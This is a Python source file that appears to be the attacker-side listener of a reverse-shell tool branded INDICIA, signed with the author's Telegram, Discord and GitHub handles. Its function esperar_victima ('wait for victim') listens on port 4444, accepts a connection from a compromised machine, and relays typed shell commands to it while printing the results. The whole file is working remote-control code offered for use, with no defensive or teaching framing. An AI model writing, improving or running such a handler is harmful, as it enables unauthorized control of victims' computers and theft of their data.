# Github   : Valengamerr
# Telegram : Valen_Qq
# Discord  : uknowuser_qq
import socket


P1 = '\033[38;5;129m' 
P2 = '\033[38;5;141m' 
P3 = '\033[38;5;189m' 
W  = '\033[1;37m'      
R  = '\033[0m'         

BANNER = rf"""
{P1}       ::::::::::: ::::    ::: ::::::::: ::::::::::: :::::::: :::::::::::     :::     
{P1}          :+:     :+:+:   :+: :+:    :+:    :+:    :+:    :+:    :+:       :+: :+:    
{P2}         +:+     :+:+:+  +:+ +:+    +:+    +:+    +:+           +:+      +:+   +:+    
{P2}        +#+     +#+ +:+ +#+ +#+    +:+    +#+    +#+           +#+     +#++:++#++:    
{P3}       +#+     +#+  +#+#+# +#+    +#+    +#+    +#+           +#+     +#+     +#+     
{P2}      #+#     #+#   #+#+# #+#    #+#    #+#    #+#    #+#    #+#     #+#     #+#      
{W}  ########### ###    #### ######### ########### ######## ########### ###     ### 
"""
def esperar_victima():
    print(BANNER)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    print(f"{W}[+] Esperando cliente en [4444]...{R}")
    
    conn, addr = server.accept()
    print(f"{P1}[*] Cliente conectado desde {addr[0]}{R}\n")
    
    while True:
        try:

            conn.send(b"__GET_CWD__")
            current_dir = conn.recv(1024).decode(errors='replace').strip()
            

            header = f"{P1}┏━━━━━━[ Creado por t.me/Valen_Qq ]━━━━━[ Ruta: {P3}{current_dir} {P1}]"
            prompt = f"{header}\n{P1}┗━━━━ {W}INDICIA -» {R}"
            
            cmd = input(prompt)
            if not cmd.strip(): continue
            if cmd.lower() in ['exit', 'quit']: break
            
            conn.send(cmd.encode())
            

            result = b""
            conn.settimeout(2)
            try:
                while True:
                    data = conn.recv(4096)
                    if not data: break
                    result += data
                    if len(data) < 4096: break
            except socket.timeout:
                pass
            
            print(result.decode('utf-8', errors='replace'))
        except Exception as e:
            print(f"Conexion perdida: {e}")
            break

if __name__ == "__main__":
    esperar_victima()
